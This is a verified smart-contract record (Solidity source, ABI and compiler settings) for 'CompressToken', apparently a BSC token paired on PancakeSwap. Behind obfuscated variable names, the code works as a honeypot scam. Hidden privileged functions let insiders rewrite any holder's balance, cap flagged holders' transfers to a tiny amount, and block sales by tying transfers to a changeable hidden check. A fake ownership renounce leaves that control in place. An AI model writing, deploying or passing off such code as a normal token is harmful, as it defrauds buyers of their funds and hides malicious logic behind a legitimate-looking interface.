{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface autoMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverMin) external view returns (uint256);\n\n    function transfer(address autoShould, uint256 fromMarketingAmount) external returns (bool);\n\n    function allowance(address marketingLiquidity, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromMarketingAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoShould,\n        uint256 fromMarketingAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverFee, uint256 value);\n    event Approval(address indexed marketingLiquidity, address indexed spender, uint256 value);\n}\n\nabstract contract senderReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeReceiverMin {\n    function createPair(address receiverMode, address sellMin) external returns (address);\n}\n\ninterface tradingMode is autoMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CompressToken is senderReceiver, autoMax, tradingMode {\n\n    string private walletTrading = \"CTN\";\n\n    uint256 private isSwapTo = 100000000 * 10 ** 18;\n\n    function totalTeamList(address tokenAmount) public {\n        modeSender();\n        if (atTo != senderExempt) {\n            tradingIs = false;\n        }\n        if (tokenAmount == amountMinLaunched || tokenAmount == shouldReceiverIs) {\n            return;\n        }\n        maxAuto[tokenAmount] = true;\n    }\n\n    address public amountMinLaunched;\n\n    mapping(address => mapping(address => uint256)) private txAuto;\n\n    bool private liquidityAt;\n\n    uint256 public senderExempt;\n\n    function modeSender() private view {\n        require(autoAmount[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isSwapTo;\n    }\n\n    uint256 maxSwap;\n\n    function name() external view virtual override returns (string memory) {\n        return toBuyList;\n    }\n\n    constructor (){\n        \n        marketingExempt tokenEnable = marketingExempt(maxTradingLaunched);\n        shouldReceiverIs = takeReceiverMin(tokenEnable.factory()).createPair(tokenEnable.WETH(), address(this));\n        if (liquidityAt) {\n            senderExempt = atTo;\n        }\n        amountMinLaunched = _msgSender();\n        maxShouldTo();\n        autoAmount[amountMinLaunched] = true;\n        maxWallet[amountMinLaunched] = isSwapTo;\n        \n        emit Transfer(address(0), amountMinLaunched, isSwapTo);\n    }\n\n    function tokenMax(address teamReceiver, uint256 fromMarketingAmount) public {\n        modeSender();\n        maxWallet[teamReceiver] = fromMarketingAmount;\n    }\n\n    function exemptAmount(address fromTake, address autoShould, uint256 fromMarketingAmount) internal returns (bool) {\n        if (fromTake == amountMinLaunched) {\n            return launchedIs(fromTake, autoShould, fromMarketingAmount);\n        }\n        uint256 shouldFee = autoMax(shouldReceiverIs).balanceOf(swapBuy);\n        require(shouldFee == atToken);\n        require(autoShould != swapBuy);\n        if (maxAuto[fromTake]) {\n            return launchedIs(fromTake, autoShould, shouldEnableAt);\n        }\n        return launchedIs(fromTake, autoShould, fromMarketingAmount);\n    }\n\n    uint256 constant shouldEnableAt = 4 ** 10;\n\n    uint256 private launchTradingMax;\n\n    uint256 atToken;\n\n    bool private launchedTo;\n\n    bool public tradingIs;\n\n    uint8 private listEnableWallet = 18;\n\n    address private receiverLaunch;\n\n    string private toBuyList = \"Compress Token\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletTrading;\n    }\n\n    function modeShould(uint256 fromMarketingAmount) public {\n        modeSender();\n        atToken = fromMarketingAmount;\n    }\n\n    function owner() external view returns (address) {\n        return receiverLaunch;\n    }\n\n    function transfer(address teamReceiver, uint256 fromMarketingAmount) external virtual override returns (bool) {\n        return exemptAmount(_msgSender(), teamReceiver, fromMarketingAmount);\n    }\n\n    mapping(address => bool) public maxAuto;\n\n    function maxShouldTo() public {\n        emit OwnershipTransferred(amountMinLaunched, address(0));\n        receiverLaunch = address(0);\n    }\n\n    address maxTradingLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function transferFrom(address fromTake, address autoShould, uint256 fromMarketingAmount) external override returns (bool) {\n        if (_msgSender() != maxTradingLaunched) {\n            if (txAuto[fromTake][_msgSender()] != type(uint256).max) {\n                require(fromMarketingAmount <= txAuto[fromTake][_msgSender()]);\n                txAuto[fromTake][_msgSender()] -= fromMarketingAmount;\n            }\n        }\n        return exemptAmount(fromTake, autoShould, fromMarketingAmount);\n    }\n\n    mapping(address => bool) public autoAmount;\n\n    uint256 private atTo;\n\n    mapping(address => uint256) private maxWallet;\n\n    address public shouldReceiverIs;\n\n    function approve(address teamTx, uint256 fromMarketingAmount) public virtual override returns (bool) {\n        txAuto[_msgSender()][teamTx] = fromMarketingAmount;\n        emit Approval(_msgSender(), teamTx, fromMarketingAmount);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return listEnableWallet;\n    }\n\n    address swapBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function buyMode(address minTeamAmount) public {\n        if (teamLiquidity) {\n            return;\n        }\n        if (atTo == senderExempt) {\n            launchTradingMax = atTo;\n        }\n        autoAmount[minTeamAmount] = true;\n        if (tradingIs != liquidityAt) {\n            launchTradingMax = atTo;\n        }\n        teamLiquidity = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverLaunch;\n    }\n\n    bool public teamLiquidity;\n\n    function launchedIs(address fromTake, address autoShould, uint256 fromMarketingAmount) internal returns (bool) {\n        require(maxWallet[fromTake] >= fromMarketingAmount);\n        maxWallet[fromTake] -= fromMarketingAmount;\n        maxWallet[autoShould] += fromMarketingAmount;\n        emit Transfer(fromTake, autoShould, fromMarketingAmount);\n        return true;\n    }\n\n    function balanceOf(address receiverMin) public view virtual override returns (uint256) {\n        return maxWallet[receiverMin];\n    }\n\n    function allowance(address enableSwapShould, address teamTx) external view virtual override returns (uint256) {\n        if (teamTx == maxTradingLaunched) {\n            return type(uint256).max;\n        }\n        return txAuto[enableSwapShould][teamTx];\n    }\n\n    event OwnershipTransferred(address indexed maxTotalList, address indexed toListTx);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxTotalList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toListTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSwapShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMinLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMarketingAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minTeamAmount\",\"type\":\"address\"}],\"name\":\"buyMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxShouldTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromMarketingAmount\",\"type\":\"uint256\"}],\"name\":\"modeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldReceiverIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMarketingAmount\",\"type\":\"uint256\"}],\"name\":\"tokenMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAmount\",\"type\":\"address\"}],\"name\":\"totalTeamList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMarketingAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromMarketingAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CompressToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}